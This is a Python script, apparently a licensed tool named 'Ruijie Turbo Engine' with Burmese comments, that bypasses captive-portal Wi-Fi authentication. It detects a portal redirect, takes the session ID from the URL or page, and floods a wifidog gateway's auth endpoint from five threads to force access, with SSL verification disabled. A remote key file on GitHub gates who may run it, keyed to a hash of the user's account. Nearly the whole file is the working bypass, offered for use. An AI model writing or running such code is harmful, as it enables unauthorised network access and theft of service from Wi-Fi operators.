import requests, re, urllib3, time, threading, random, os, sys
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

# SSL Warning ပိတ်ရန်
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# 🌐 GITHUB REMOTE CONFIG
# ===============================
GITHUB_USER = "tmmt6132-coder"
REPO_NAME = "Bypass"
URL_TO_KEYS = f"https://raw.githubusercontent.com/{GITHUB_USER}/{REPO_NAME}/main/keys.txt"

def get_system_id():
    try:
        import hashlib
        combined = str(os.getuid()) + os.environ.get('USER', 'unknown')
        return hashlib.md5(combined.encode()).hexdigest()[:10].upper()
    except:
        return "GET-ID-ERR"

def check_remote_approval():
    os.system('clear' if os.name == 'posix' else 'cls')
    sys_id = get_system_id()
    print(f"\033[95m╔════════════════════════════════════════╗\n║       TURBO ENGINE ACCESS CONTROL      ║\n╚════════════════════════════════════════╝\033[0m")
    print(f"\n[📡] Your System ID: \033[92m{sys_id}\033[0m")
    
    try:
        # Cache Buster ပါဝင်သော Remote Check
        t_buster = f"?t={int(time.time())}"
        response = requests.get(URL_TO_KEYS + t_buster, timeout=10)
        if response.status_code != 200: return False
        
        lines = response.text.strip().splitlines()
        for line in lines:
            line = line.strip()
            if "," not in line or line.startswith("#"): continue
            allowed_id, exp_str = line.split(',')
            if sys_id == allowed_id.strip():
                if datetime.now() < datetime.strptime(exp_str.strip(), '%Y-%m-%d'):
                    print(f"\033[92m[✓] ACCESS GRANTED! (Expires: {exp_str})\033[0m")
                    time.sleep(1.5)
                    return True
        return False
    except: return False

# ===============================
# 🚀 CORE BYPASS LOGIC (အခုဒါက အလုပ်လုပ်ပါလိမ့်မယ်)
# ===============================
def high_speed_ping(auth_link, sid):
    while True:
        try:
            requests.get(auth_link, timeout=5, verify=False)
            print(f"\r\033[0;32m[✓]\033[0m Engine Active | SID: {sid[:8]} | Pulse Sending...", end="")
        except: pass
        time.sleep(0.1)

def start_process():
    os.system('clear')
    print(f"\033[96m[*] Ruijie Turbo Engine v2.5 Initializing...\033[0m")
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    
    while True:
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url != test_url:
                print(f"\n\033[93m[!] Captive Portal Detected!\033[0m")
                parsed = urlparse(r.url)
                params = parse_qs(parsed.query)
                
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                sid = params.get('sessionId', [None])[0]
                
                if not sid:
                    # Alternative SID extraction
                    sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r.text)
                    sid = sid_match.group(1) if sid_match else "UNKNOWN"

                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
                print(f"\033[94m[*] Captured SID: {sid}\033[0m")
                print(f"\033[35m[*] Launching Multi-Threads...\033[0m")

                for _ in range(5):
                    threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
                
                # အင်တာနက်ရသွားရင် ခဏစောင့်မယ်
                while requests.get(test_url, timeout=5).status_code == 204:
                    time.sleep(10)
                    
            print(f"\r\033[90m[*] Monitoring Network Status... (Stable)\033[0m", end="")
            time.sleep(5)
        except KeyboardInterrupt:
            print(f"\n\033[91m[!] Stopped.\033[0m"); break
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    if check_remote_approval():
        start_process()
    else:
        print(f"\n\033[91m[!] Not Authorized. Contact Admin.\033[0m")
        sys.exit()
        
